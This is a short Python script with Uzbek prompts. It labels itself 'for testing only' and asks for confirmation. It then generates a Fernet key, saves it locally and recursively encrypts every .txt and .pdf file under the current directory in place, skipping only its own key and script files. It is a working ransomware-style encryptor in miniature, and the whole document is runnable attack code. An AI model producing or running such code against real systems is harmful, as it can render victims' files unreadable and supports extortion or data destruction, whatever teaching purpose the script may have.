#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

print("Bu faqat test uchun!")
answer = input("Davom etishni xohlaysizmi? (ha/yoq): ")

if answer.lower() not in ["ha", "xa"]:
    print("Bekor qilindi.")
else:
    # Generate and save key
    key = Fernet.generate_key()

    try:
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    except Exception as e:
        print("Kalitni saqlashda xatolik:", e)

    fernet = Fernet(key)

    # Walk recursively
    for root, dirs, files in os.walk("."):
        for file in files:

            if file == "key.key" or file == "encryptor.py" or file=="decryptor.py" or file == "crypt.py" or file == "decrypt.py":
                continue

            if file.endswith((".txt", ".pdf")):
                path = os.path.join(root, file)

                try:
                    with open(path, "rb") as f:
                        data = f.read()

                    encrypted = fernet.encrypt(data)

                    with open(path, "wb") as f:
                        f.write(encrypted)

                    print("Shifrlangan:", path)

                except Exception as e:
                    print("Xatolik:", path, "->", e)

    print("\nBarcha mos fayllar shifrlanib bo‘ldi.")
